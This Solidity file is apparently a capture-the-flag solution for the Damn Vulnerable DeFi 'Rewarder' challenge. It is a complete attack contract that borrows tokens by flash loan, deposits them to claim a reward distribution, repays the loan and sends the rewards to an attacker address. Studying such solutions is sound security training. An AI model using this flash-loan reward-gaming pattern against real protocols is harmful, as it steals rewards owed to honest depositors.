// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}
interface ITheRewarderPool {

    // Minimum duration of each round of rewards in seconds
    function deposit(uint256 amountToDeposit) external;
    function distributeRewards() external returns (uint256);
    function withdraw(uint256 amountToWithdraw) external;
}
contract RewarderAttack{
    address flashLoan;
    address rewardPool;
    address liquidityToken;
    address attcker;
    address rewardToken;
    constructor(address _flashLoan, address _rewardPool,address _liquidityToken, address _rewardToken, address _attcker){
        flashLoan = _flashLoan;
        rewardPool = _rewardPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        attcker = _attcker;

    }
    function attack(uint256 amount) external{
        IFlashLoanerPool(flashLoan).flashLoan(amount);
    }

    function receiveFlashLoan(uint256 _amount) external{
        DamnValuableToken(liquidityToken).approve(rewardPool,_amount);
        ITheRewarderPool(rewardPool).deposit(_amount);
        ITheRewarderPool(rewardPool).distributeRewards();
        ITheRewarderPool(rewardPool).withdraw(_amount);

        DamnValuableToken(liquidityToken).transfer(flashLoan,_amount);
        uint256 rewardAmount = ERC20(rewardToken).balanceOf(address(this));
        ERC20(rewardToken).transfer(attcker,rewardAmount);
    }
}